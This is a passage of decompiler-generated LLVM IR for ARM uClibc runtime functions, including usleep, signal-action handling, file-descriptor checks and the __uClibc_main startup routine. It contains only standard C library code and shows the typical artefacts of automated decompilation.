  store i32 0, i32* %v3_16e68, align 4
  %v0_16e6c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_16e6c = add i32 %v0_16e6c.pre, -1
  store i32 %v1_16e6c, i32* %r1.global-to-local, align 4
  %v6_16e6c = icmp slt i32 %v1_16e6c, 0
  %v4_16e74 = mul i32 %v1_16e6c, 4
  %v5_16e74 = add i32 %v4_16e74, %v16_16dd8
  br i1 %v6_16e6c, label %dec_label_pc_16e7c, label %dec_label_pc_16e64

dec_label_pc_16e7c:                               ; preds = %dec_label_pc_16e64
  store i32 %v2_16e08, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_16e84 = call i32 @__sigaddset()
  store i32 %v0_16e84, i32* %r0.global-to-local, align 4
  %v1_16e88 = icmp slt i32 %v0_16e84, 0
  br i1 %v1_16e88, label %dec_label_pc_16f6c, label %dec_label_pc_16e90

dec_label_pc_16e90:                               ; preds = %dec_label_pc_16e7c
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_16e9c = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_16de0)
  store i32 %v4_16e9c, i32* %r0.global-to-local, align 4
  %v1_16ea0 = icmp slt i32 %v4_16e9c, 0
  br i1 %v1_16ea0, label %dec_label_pc_16ea8, label %dec_label_pc_16ed0

dec_label_pc_16ea8:                               ; preds = %dec_label_pc_16e90
  %v0_16ea8 = call i32 @__errno_location()
  store i32 %v2_16e2c, i32* %r1.global-to-local, align 4
  store i32 %v0_16ea8, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_16ebc = inttoptr i32 %v0_16ea8 to i32*
  %v2_16ebc = load i32, i32* %v1_16ebc, align 4
  store i32 %v2_16ebc, i32* @r4, align 4
  %v3_16ec0 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_16ec0 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_16ec0, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_16ec8 = load i32, i32* @r4, align 4
  %v1_16ec8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16ec8 = inttoptr i32 %v1_16ec8 to i32*
  store i32 %v0_16ec8, i32* %v2_16ec8, align 4
  %v17_16f74.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f70

dec_label_pc_16ed0:                               ; preds = %dec_label_pc_16e90
  %v2_16ed0 = load i32, i32* %stack_var_-424, align 4
  %v7_16ed4 = icmp eq i32 %v2_16ed0, 1
  %v2_16edc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_16edc, i32* @r4, align 4
  br i1 %v7_16ed4, label %dec_label_pc_16ee4, label %dec_label_pc_16f18

dec_label_pc_16ee4:                               ; preds = %dec_label_pc_16ed0
  store i32 %v2_16edc, i32* %r1.global-to-local, align 4
  store i32 %v2_16edc, i32* %r0.global-to-local, align 4
  %v2_16eec = bitcast i32* %stack_var_-28 to %timespec*
  %v3_16eec = call i32 @__libc_nanosleep(%timespec* %v2_16eec, i32 %v2_16edc)
  store i32 %v3_16eec, i32* %r0.global-to-local, align 4
  store i32 %v3_16eec, i32* %r6.global-to-local, align 4
  %v0_16ef4 = call i32 @__errno_location()
  store i32 %v2_16e2c, i32* %r1.global-to-local, align 4
  store i32 %v0_16ef4, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_16f08 = inttoptr i32 %v0_16ef4 to i32*
  %v2_16f08 = load i32, i32* %v1_16f08, align 4
  store i32 %v2_16f08, i32* @r4, align 4
  %v3_16f0c = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_16f0c = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_16f0c, i32 0)
  store i32 %v4_16f0c, i32* %r0.global-to-local, align 4
  %v0_16f10 = load i32, i32* @r4, align 4
  %v1_16f10 = load i32, i32* %r5.global-to-local, align 4
  %v2_16f10 = inttoptr i32 %v1_16f10 to i32*
  store i32 %v0_16f10, i32* %v2_16f10, align 4
  %v0_16f40.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16f40

dec_label_pc_16f18:                               ; preds = %dec_label_pc_16ed0
  store i32 %v2_16e2c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_16f24 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_16f24 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_16f24, i32 0)
  store i32 %v4_16f24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f34

dec_label_pc_16f34:                               ; preds = %dec_label_pc_16e48.dec_label_pc_16f34_crit_edge, %dec_label_pc_16f18
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_16e48.dec_label_pc_16f34_crit_edge ], [ %v2_16edc, %dec_label_pc_16f18 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_16f38 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_16f38 = call i32 @__libc_nanosleep(%timespec* %v2_16f38, i32 %storemerge.pre-phi)
  store i32 %v3_16f38, i32* %r0.global-to-local, align 4
  store i32 %v3_16f38, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16f40

dec_label_pc_16f40:                               ; preds = %dec_label_pc_16ee4, %dec_label_pc_16f34
  %v0_16f40 = phi i32 [ %v0_16f40.pr, %dec_label_pc_16ee4 ], [ %v3_16f38, %dec_label_pc_16f34 ]
  %v2_16f40 = icmp eq i32 %v0_16f40, 0
  br i1 %v2_16f40, label %dec_label_pc_16f64, label %dec_label_pc_16f48

dec_label_pc_16f48:                               ; preds = %dec_label_pc_16f40
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_16f50 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_16f50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f70

dec_label_pc_16f64:                               ; preds = %entry, %dec_label_pc_16f40
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f70

dec_label_pc_16f6c:                               ; preds = %dec_label_pc_16e2c, %dec_label_pc_16e7c, %dec_label_pc_16e08
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f70

dec_label_pc_16f70:                               ; preds = %dec_label_pc_16f48, %dec_label_pc_16f64, %dec_label_pc_16ea8, %dec_label_pc_16f6c
  %v17_16f74 = phi i32 [ %v3_16f50, %dec_label_pc_16f48 ], [ 0, %dec_label_pc_16f64 ], [ %v17_16f74.pre, %dec_label_pc_16ea8 ], [ -1, %dec_label_pc_16f6c ]
  %v2_16f74 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16f74, i32* @r4, align 4
  store i32 %v6_16dd8, i32* @r5, align 4
  store i32 %v9_16dd8, i32* @r6, align 4
  ret i32 %v17_16f74

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_16edc, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_16e6c, { 0, 2, 1 }
  uselistorder i32 %v2_16e2c, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_16e24, { 1, 0, 2 }
  uselistorder i32 %v1_16df8, { 0, 2, 1 }
  uselistorder i32 %v16_16dd8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 17, 19, 18, 21, 20, 22, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 -136, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_16f70, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16f6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16f64, { 1, 0 }
  uselistorder label %dec_label_pc_16f40, { 1, 0 }
  uselistorder label %dec_label_pc_16f34, { 1, 0 }
  uselistorder label %dec_label_pc_16e64, { 1, 0 }
  uselistorder label %dec_label_pc_16df0, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_16f7c = load i32, i32* @r4, align 4
  store i32 1000000, i32* @r4, align 4
  %v2_16f90 = udiv i32 %arg1, 1000000
  store i32 %v2_16f90, i32* %stack_var_-20, align 4
  %v2_16fb8 = bitcast i32* %stack_var_-20 to %timespec*
  %v3_16fb8 = call i32 @__libc_nanosleep(%timespec* %v2_16fb8, i32 0)
  store i32 %v3_16f7c, i32* @r4, align 4
  ret i32 %v3_16fb8

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_16ff4:
  %stack_var_-8 = alloca i32, align 4
  %v3_16fc8 = load i32, i32* @r4, align 4
  store i32 %v3_16fc8, i32* %stack_var_-8, align 4
  %v2_16ff8 = load i32, i32* @global_var_2caac.1074, align 4
  %v2_16ffc = icmp eq i32 %v2_16ff8, 0
  br i1 %v2_16ffc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_16ff4
  call void @__pseudo_branch(i32 %v2_16ff8)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16ff4, %bb
  %v2_1700c = load i32, i32* @global_var_2cab0.1076, align 4
  %v2_17010 = icmp eq i32 %v2_1700c, 0
  br i1 %v2_17010, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_17014 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_17014, i32* @r4, align 4
  %v9_17014 = load i32, i32* @r0, align 4
  ret i32 %v9_17014

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_1700c)
  %v2_17020 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17020, i32* @r4, align 4
  %v8_17020 = load i32, i32* @r0, align 4
  ret i32 %v8_17020

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_1703c = load i32, i32* @r0, align 4
  ret i32 %v1_1703c
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17040 = load i32, i32* @r4, align 4
  store i32 %v3_17040, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_17050 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_17054 = icmp eq i32 %v2_17050, -1
  br i1 %v7_17054, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_17058 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_17058, i32* @r4, align 4
  ret i32 %v2_17050

bb4:                                              ; preds = %entry
  %v0_1705c = load i32, i32* @r4, align 4
  %v4_17064 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1de98.1079, i32 0, i32 0), i32 %v0_1705c)
  %v1_17068 = load i32, i32* %r5.global-to-local, align 4
  %v9_17068 = icmp eq i32 %v4_17064, %v1_17068
  br i1 %v9_17068, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_1706c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_1706c, i32* @r4, align 4
  ret i32 %v4_17064

bb6:                                              ; preds = %bb4
  %v0_17070 = call i32 @abort()
  %v0_17074 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17074, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_17070

; uselistorder directives
  uselistorder i32 %v2_17050, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 5, 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1707c = load i32, i32* @global_var_2cab4.1081, align 4
  %v2_17080 = icmp eq i32 %v2_1707c, 0
  br i1 %v2_17080, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_1708c = load i32, i32* @r0, align 4
  ret i32 %v6_1708c

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_2cab4.1081, align 4
  store i32 4096, i32* @global_var_2caa8.835, align 4
  %v0_170c0 = call i32 @_stdio_init()
  ret i32 %v0_170c0
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_170d8 = mul i32 %arg2, 4
  %v5_170d8 = add i32 %tmp, %v4_170d8
  %v2_170dc = load i32, i32* %arg3, align 4
  %v2_170e0 = ptrtoint i32* %stack_var_-120 to i32
  %v1_170e4 = add i32 %v5_170d8, 4
  %v9_170e8 = icmp eq i32 %v1_170e4, %v2_170dc
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_2caa0.1087, align 4
  store i32 %v1_170e4, i32* @global_var_2caa4.1067, align 4
  store i32 %arg6, i32* @global_var_2cab0.1076, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_170e8, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_170d8, i32* @global_var_2caa4.1067, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_17128 = bitcast i32* %stack_var_-120 to i8*
  %v3_17128 = call i32 @__GI_memset(i8* %v2_17128, i32 0)
  %storemerge.pre = load i32, i32* @global_var_2caa4.1067, align 4
  br label %dec_label_pc_17138

dec_label_pc_17138:                               ; preds = %dec_label_pc_17138, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_17138, %dec_label_pc_17138 ]
  %v1_17138 = inttoptr i32 %storemerge to i32*
  %v2_17138 = load i32, i32* %v1_17138, align 4
  %v4_17138 = add i32 %storemerge, 4
  %v2_1713c = icmp eq i32 %v2_17138, 0
  br i1 %v2_1713c, label %dec_label_pc_17148, label %dec_label_pc_17138

dec_label_pc_17148:                               ; preds = %dec_label_pc_17138
  store i32 %v4_17138, i32* @r4, align 4
  %v1_1716822 = inttoptr i32 %v4_17138 to i32*
  %v2_1716823 = load i32, i32* %v1_1716822, align 4
  %v2_1716c25 = icmp eq i32 %v2_1716823, 0
  br i1 %v2_1716c25, label %dec_label_pc_17174, label %dec_label_pc_17150

dec_label_pc_17150:                               ; preds = %dec_label_pc_17148, %dec_label_pc_17168
  %v5_17154 = phi i32 [ %v2_17168, %dec_label_pc_17168 ], [ %v2_1716823, %dec_label_pc_17148 ]
  %v2_17150 = icmp ugt i32 %v5_17154, 13
  %v7_17150 = icmp eq i32 %v5_17154, 14
  %v2_17154 = xor i1 %v2_17150, true
  %v3_17154 = or i1 %v7_17150, %v2_17154
  br i1 %v3_17154, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_17150
  %v6_17154 = and i32 %v5_17154, 536870912
  %v7_17154 = icmp ne i32 %v6_17154, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_17150, %bb42
  %v1_17160 = phi i1 [ %v2_17150, %dec_label_pc_17150 ], [ %v7_17154, %bb42 ]
  %v2_17158 = xor i1 %v1_17160, true
  %v3_17158 = or i1 %v7_17150, %v2_17158
  br i1 %v3_17158, label %bb44, label %dec_label_pc_17168

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_17168

dec_label_pc_17168:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_17158, i32 ptrtoint ([3 x i8]* @global_var_14e70.1090 to i32))
  %v0_17164 = load i32, i32* @r4, align 4
  %v1_17164 = add i32 %v0_17164, 8
  store i32 %v1_17164, i32* @r4, align 4
  %v1_17168 = inttoptr i32 %v1_17164 to i32*
  %v2_17168 = load i32, i32* %v1_17168, align 4
  %v2_1716c = icmp eq i32 %v2_17168, 0
  br i1 %v2_1716c, label %dec_label_pc_17174, label %dec_label_pc_17150

dec_label_pc_17174:                               ; preds = %dec_label_pc_17168, %dec_label_pc_17148
  %v1_17178 = call i32 @_dl_aux_init(i32 %v2_170e0)
  store i32 %v1_17178, i32* @r0, align 4
  %v1_1717c = call i32 @__GI___uClibc_init(i32 %v1_17178)
  store i32 %v1_1717c, i32* @r0, align 4
  %v2_17188 = icmp eq i32 %tmp37, 0
  br i1 %v2_17188, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_17174
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_17174, %bb45
  %v0_17198 = phi i32 [ %tmp37, %dec_label_pc_17174 ], [ 4096, %bb45 ]
  %v3_17190 = icmp eq i32 %tmp36, -1
  %v8_17190 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_2caa8.835 to i32), i32* @r2, align 4
  store i32 %v0_17198, i32* @global_var_2caa8.835, align 4
  br i1 %v3_17190, label %dec_label_pc_171a0, label %dec_label_pc_171c8

dec_label_pc_171a0:                               ; preds = %bb46
  %v0_171a0 = call i32 @getuid()
  store i32 %v0_171a0, i32* @r0, align 4
  store i32 %v0_171a0, i32* @r4, align 4
  %v0_171a8 = call i32 @geteuid()
  %v0_171ac = load i32, i32* @r4, align 4
  %v9_171ac = icmp eq i32 %v0_171ac, %v0_171a8
  br i1 %v9_171ac, label %dec_label_pc_171b4, label %dec_label_pc_171f0

dec_label_pc_171b4:                               ; preds = %dec_label_pc_171a0
  %v1_171b4 = call i32 @getgid(i32 %v0_171a8)
  store i32 %v1_171b4, i32* @r0, align 4
  store i32 %v1_171b4, i32* @r4, align 4
  %v0_171bc = call i32 @getegid()
  %v0_171c0 = load i32, i32* @r4, align 4
  %v9_171c0 = icmp eq i32 %v0_171c0, %v0_171bc
  br i1 %v9_171c0, label %dec_label_pc_171c8, label %dec_label_pc_171f0

dec_label_pc_171c8:                               ; preds = %dec_label_pc_171b4, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_17190, label %dec_label_pc_1725c, label %dec_label_pc_171d4

dec_label_pc_171d4:                               ; preds = %dec_label_pc_171c8
  %v9_171d8 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_171d8, label %dec_label_pc_171e0, label %dec_label_pc_171f0

dec_label_pc_171e0:                               ; preds = %dec_label_pc_171d4
  br label %dec_label_pc_171f0

dec_label_pc_171f0:                               ; preds = %dec_label_pc_171e0, %dec_label_pc_171d4, %dec_label_pc_171b4, %dec_label_pc_171a0
  %v2_171f8 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_17204 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_17210 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_1725c

dec_label_pc_1725c:                               ; preds = %dec_label_pc_171f0, %dec_label_pc_171c8
  %v0_17220 = load i32, i32* @r6, align 4
  %v1_17220 = inttoptr i32 %v0_17220 to i32*
  %v2_17220 = load i32, i32* %v1_17220, align 4
  store i32 %v2_17220, i32* @global_var_2681c, align 4
  store i32 %arg5, i32* @global_var_2caac.1074, align 4
  %v2_1725c = icmp eq i32 %arg4, 0
  br i1 %v2_1725c, label %dec_label_pc_17298, label %bb47

bb47:                                             ; preds = %dec_label_pc_1725c
  br label %dec_label_pc_17298

dec_label_pc_17298:                               ; preds = %dec_label_pc_1725c, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_172a8 = call i32 @__errno_location()
  %v2_172b0 = inttoptr i32 %v1_172a8 to i32*
  store i32 0, i32* %v2_172b0, align 4
  %v1_172c4 = call i32 @__GI___h_errno_location()
  %v2_172cc = inttoptr i32 %v1_172c4 to i32*
  store i32 0, i32* %v2_172cc, align 4
  %v0_172dc = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_172e8 = call i32 @__GI_exit(i32 %v0_172dc)
  ret i32 %v1_172e8

; uselistorder directives
  uselistorder i32 %v2_17168, { 1, 0 }
  uselistorder i32 %v1_17164, { 1, 0 }
  uselistorder i1 %v2_17150, { 1, 0 }
  uselistorder i32 %v4_17138, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 7, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_2caa8.835, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 4096, { 2, 3, 15, 6, 16, 4, 1, 12, 5, 7, 8, 13, 14, 9, 17, 10, 18, 0, 11 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder i32 13, { 1, 3, 0, 2 }
  uselistorder i32 120, { 2, 0, 1 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17298, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_17168, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_17150, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_17320 = load i32, i32* @r4, align 4
  %v6_17320 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_17324 = icmp eq i32* %arg2, null
  %v2_17328 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_17324, label %dec_label_pc_17394, label %dec_label_pc_17338

dec_label_pc_17338:                               ; preds = %entry
  %v2_1733c = load i32, i32* %arg2, align 4
  %v4_1733c = add i32 %tmp, 4
  store i32 %v4_1733c, i32* @r1, align 4
  %v2_17340 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_17340, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_1733c, i32* %stack_var_-156, align 4
  %v0_1734c = call i32 @memcpy()
  store i32 %v0_1734c, i32* %r0.global-to-local, align 4
  %v0_17350 = load i32, i32* @r4, align 4
  %v1_17350 = add i32 %v0_17350, 132
  %v2_17350 = inttoptr i32 %v1_17350 to i32*
  %v3_17350 = load i32, i32* %v2_17350, align 4
  %v1_17354 = and i32 %v3_17350, 67108864
  %v2_17354 = icmp eq i32 %v1_17354, 0
  br i1 %v2_17354, label %dec_label_pc_17368, label %bb

bb:                                               ; preds = %dec_label_pc_17338
  br label %dec_label_pc_17384

dec_label_pc_17368:                               ; preds = %dec_label_pc_17338
  %v1_17370 = and i32 %v3_17350, 4
  %v2_17370 = icmp eq i32 %v1_17370, 0
  br i1 %v2_17370, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_17368
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_17368, %bb20
  br label %dec_label_pc_17384

dec_label_pc_17384:                               ; preds = %bb, %bb21
  %v2_17384 = icmp eq i32 %v0_17350, 0
  %v3_17388 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_17388 = select i1 %v2_17384, i32 0, i32 %v3_17388
  %v0_17394.pre = load i32, i32* @r5, align 4
  %v0_173a4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17394

dec_label_pc_17394:                               ; preds = %dec_label_pc_17384, %entry
  %v0_173a4 = phi i32 [ %arg1, %entry ], [ %v0_173a4.pre, %dec_label_pc_17384 ]
  %v0_17394 = phi i32 [ %arg3, %entry ], [ %v0_17394.pre, %dec_label_pc_17384 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_17388, %dec_label_pc_17384 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_17394 = icmp eq i32 %v0_17394, 0
  %.v2_17328 = select i1 %v2_17394, i32 0, i32 %v2_17328
  store i32 %.v2_17328, i32* @r2, align 4
  store i32 %v0_173a4, i32* %r0.global-to-local, align 4
  %v1_173a8 = call i32 @__syscall_rt_sigaction(i32 %v0_173a4)
  store i32 %v1_173a8, i32* %r0.global-to-local, align 4
  %v0_173ac = load i32, i32* @r5, align 4
  %v2_173ac = icmp eq i32 %v0_173ac, 0
  br i1 %v2_173ac, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_17394
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_17394, %bb25
  %v0_173bc.pr = phi i32 [ 0, %dec_label_pc_17394 ], [ 1, %bb25 ]
  %v1_173b4 = icmp slt i32 %v1_173a8, 0
  br i1 %v1_173b4, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_173f0

thread-pre-split:                                 ; preds = %bb26
  %v2_173bc = icmp eq i32 %v0_173bc.pr, 0
  store i32 %v1_173a8, i32* @r4, align 4
  br i1 %v2_173bc, label %dec_label_pc_173f0, label %dec_label_pc_173c8

dec_label_pc_173c8:                               ; preds = %thread-pre-split
  %v2_173c8 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_173ac, i32* %r0.global-to-local, align 4
  %v2_173d0 = inttoptr i32 %v0_173ac to i32*
  store i32 %v2_173c8, i32* %v2_173d0, align 4
  %v3_173d0 = load i32, i32* %r0.global-to-local, align 4
  %v4_173d0 = add i32 %v3_173d0, 4
  store i32 %v4_173d0, i32* @r0, align 4
  %v2_173d4 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_173d4, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_173dc = call i32 @memcpy()
  store i32 %v0_173dc, i32* %r0.global-to-local, align 4
  %v1_173e4 = load i32, i32* @r5, align 4
  %v2_173e4 = add i32 %v1_173e4, 136
  %v3_173e4 = inttoptr i32 %v2_173e4 to i32*
  %v1_173ec = load i32, i32* @r5, align 4
  %v2_173ec = add i32 %v1_173ec, 132
  %v3_173ec = inttoptr i32 %v2_173ec to i32*
  %v0_173f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_173f0

dec_label_pc_173f0:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_173c8
  %v0_173f0 = phi i32 [ %v1_173a8, %thread-pre-split ], [ %v0_173f0.pre, %dec_label_pc_173c8 ], [ %v1_173a8, %thread-pre-split.thread ]
  store i32 %v0_173f0, i32* %r0.global-to-local, align 4
  store i32 %v3_17320, i32* @r4, align 4
  store i32 %v6_17320, i32* @r5, align 4
  ret i32 %v0_173f0

; uselistorder directives
  uselistorder i32 %v0_173f0, { 1, 0 }
  uselistorder i32 %v0_173ac, { 1, 0, 2 }
  uselistorder i32 %v0_173a4, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder i32 136, { 1, 0 }
  uselistorder i32 132, { 1, 2, 0 }
  uselistorder label %dec_label_pc_173f0, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_17384, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_17404 = load i32, i32* @r4, align 4
  store i32 %v3_17404, i32* %stack_var_-8, align 4
  %v0_17408 = load i32, i32* @r0, align 4
  %v0_1740c = call i32 @__errno_location()
  %v1_17410 = sub i32 0, %v0_17408
  %v2_17414 = inttoptr i32 %v0_1740c to i32*
  store i32 %v1_17410, i32* %v2_17414, align 4
  %v2_1741c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1741c, i32* @r4, align 4
  ret i32 -1
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_17420 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_17420
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_17424 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_17424
}

